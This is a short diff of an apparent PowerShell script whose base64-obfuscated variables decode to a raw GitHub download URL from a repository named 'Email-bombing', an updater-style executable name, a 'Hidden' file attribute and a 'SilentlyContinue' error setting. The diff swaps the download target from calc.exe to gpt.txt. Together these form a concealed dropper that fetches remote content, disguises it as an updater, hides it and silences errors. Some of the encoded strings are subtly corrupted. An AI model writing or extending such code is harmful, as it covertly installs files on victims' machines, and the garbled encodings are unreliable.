@@ -1,4 +1,4 @@
-$downloadUrlB64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FCSVJIT1NTQUlOMTAvRW1haWwtYm9tYmluZy9yZWZzL2hlYWRzL21haW4vY2FsYy5leGU="
+$downloadUrlB64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FCSVJIT1NTQUlOMTAvRW1haWwtYm9tYmluZy9yZWZzL2hlYWRzL21haW4vZ3B0LnR4dA=="
 $updaterExeB64 = "dXBkYXR1ci5leGU="
 $hiddenAttrB64 = "SG1kZGVu"
 $silentlyContinueB64 = "U21sZW5@bH1jb25@aW51ZQ=="
